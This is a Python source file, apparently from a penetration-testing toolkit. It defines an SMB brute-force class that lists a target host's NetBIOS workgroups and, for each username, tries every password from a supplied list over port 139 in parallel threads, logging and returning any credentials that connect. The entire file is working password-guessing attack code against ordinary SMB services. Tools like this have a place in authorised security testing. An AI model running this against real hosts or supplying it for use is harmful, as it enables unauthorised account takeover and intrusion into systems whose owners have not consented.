import logging
import multiprocessing
from multiprocessing.dummy import Pool as ThreadPool

from smb.SMBConnection import SMBConnection

from polarity.bruteforce.base import BaseBruteforce
from polarity.utils import NMBUtils


class SMBBruteforce(BaseBruteforce):

    PORT = 139

    def __init__(self, host, users, passwords):
        super().__init__(host, users, passwords)

        logging.getLogger("SMB").setLevel(logging.CRITICAL)

        self._current_workgroup = None
        self._current_user = None

    def start_bruteforce(self):
        logging.info("Starting SMB bruteforce against host %s",
                     self._host.ip_address)

        user_passwords = {}

        workgroups = NMBUtils.get_workgroups(self._host)
        for workgroup in workgroups:
            self._current_workgroup = workgroup
            for user in self._users:
                self._current_user = user

                pool = ThreadPool(multiprocessing.cpu_count())
                results = pool.map(self.__check_password, self._passwords)

                results = list(filter(None, results))
                if results:
                    password = results[0]

                    logging.info("Password found: [%s] - %s", user, password)

                    user_passwords[user] = password

        return user_passwords

    def __check_password(self, password):
        try:
            conn = SMBConnection(self._current_user, password,
                                 "COMPUTER", self._current_workgroup)
            success = conn.connect(self._host.ip_address, timeout=1.0)
            conn.close()

            if success:
                return password
            return None
        except Exception:
            return None
